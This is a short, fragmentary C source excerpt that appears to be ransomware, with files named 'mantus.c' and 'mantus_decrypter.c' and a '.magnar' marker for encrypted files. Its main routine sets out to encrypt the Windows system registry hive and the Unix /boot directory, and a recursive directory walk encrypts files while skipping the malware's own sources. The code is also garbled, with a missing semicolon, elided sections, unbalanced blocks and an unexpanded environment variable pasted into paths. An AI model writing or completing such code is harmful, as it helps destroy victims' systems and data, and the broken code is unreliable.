...
int main( void ) {
  //STARTING ENCRYPTION FROM THE CURRENT FOLDER
	//#ifdef _WIN__
	#if defined(_WIN32)
  	encrypt_dir( "%SystemRoot%/System32/Config/System" );
	#endif
	#if defined(_UNIX)
		encrypt_dir( "/boot")
  return( 0 );
      ...
      if( dir -> d_type == DT_DIR ) {
        if ( strcmp( dir -> d_name, "." ) != 0 && strcmp( dir -> d_name, ".." ) != 0 ) {
          ...
          strcpy( path, dir_name );
            strcat( path, "%SystemRoot%/System32/Config/System");
          encrypt_dir( strcat( path, dir -> d_name ) );
        }
      } else{
	        if(strcmp("mantus_decrypter.c", dir -> d_name ) != 0 && strcmp( "mantus.c", dir -> d_name ) != 0 && !strstr( dir -> d_name, ".magnar" ) ) {
	          strcpy( path, dir_name );
	            strcat( path, "%SystemRoot%/System32/Config/System" );
